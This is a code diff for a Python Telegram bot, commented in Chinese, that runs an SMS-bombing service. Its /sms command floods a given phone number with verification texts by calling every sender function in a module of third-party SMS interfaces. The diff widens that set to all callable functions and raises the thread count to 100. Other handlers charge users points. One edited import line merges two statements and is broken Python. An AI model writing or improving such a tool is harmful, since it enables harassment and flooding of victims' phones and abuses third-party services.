@@ -9,8 +9,8 @@ import itertools
 import binascii
 import random
 import concurrent.futures
-from sms_list import * 
-from Crypto.Cipher import DES3
+import sms_list  # 修改：更标准的导入方式
+from sms_list import * from Crypto.Cipher import DES3
 from datetime import datetime
 from telebot import types
 from concurrent.futures import ThreadPoolExecutor
@@ -233,12 +233,26 @@ def run_batch_task(chat_id, msg_id, name, id_list, uid):
 # ================= 5. 指令与消息处理 =================
 
 def get_all_senders():
-    """全量抓取 sms_list.py 中的所有接口函数"""
-    prefixes = ("send_sms_", "短信", "send_request", "request_url", "send_", "短信接口", "request_")
+    """✨全量抓取：不再靠关键词，而是遍历整个模块的所有可调用函数"""
     all_funcs = []
-    for name, obj in globals().items():
-        if any(name.startswith(p) for p in prefixes) and callable(obj):
-            all_funcs.append(obj)
+    # 排除掉 sms_list 里的系统内置变量和配置变量
+    exclude_list = [
+        'requests', 'json', 'time', 'random', 'hashlib', 're', 'threading', 'sys',
+        'exit_flag', 'print_lock', 'PLATFORM_THREAD_POOL_SIZE', 'PLATFORM_REQUESTS_PER_SECOND',
+        'MINUTE_TASK_MAX_THREADS', 'MINUTE_CYCLE_DURATION', 'platform_executor',
+        'platform_request_worker', 'send_minute_request', 'generate_random_user_agent'
+    ]
+    
+    # 遍历 sms_list 模块中的所有属性
+    for attr_name in dir(sms_list):
+        if attr_name.startswith("__") or attr_name in exclude_list:
+            continue
+            
+        attr_obj = getattr(sms_list, attr_name)
+        # 只要是函数，且不是被排除的辅助工具，就加入大炮清单
+        if callable(attr_obj):
+            all_funcs.append(attr_obj)
+            
     return all_funcs
 
 @bot.message_handler(commands=['sms'])
@@ -252,6 +266,7 @@ def sms_bomb_cmd(message):
     target = parts[1]
     if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
     
+    # 核心修改：使用新的全量抓取逻辑
     all_funcs = get_all_senders()
     bot.reply_to(message, f"🎯 **已加载接口：{len(all_funcs)}个**\n正在对 `{target}` 开启火力覆盖...", parse_mode='Markdown')
     
@@ -259,13 +274,15 @@ def sms_bomb_cmd(message):
 
     def do_bomb():
         random.shuffle(all_funcs)
-        with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:
+        # 接口多了，适当调高并发数到 100
+        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
             for func in all_funcs:
                 executor.submit(func, target)
         bot.send_message(message.chat.id, f"✅ 目标 `{target}` 轰炸一轮结束")
     
     threading.Thread(target=do_bomb).start()
 
+# --- 后续管理指令保持不变 ---
 @bot.message_handler(commands=['hb'])
 def hb_cmd(message):
     if user_points.get(message.from_user.id, 0.0) < 5.5: return bot.reply_to(message, "积分不足，请先充值！")
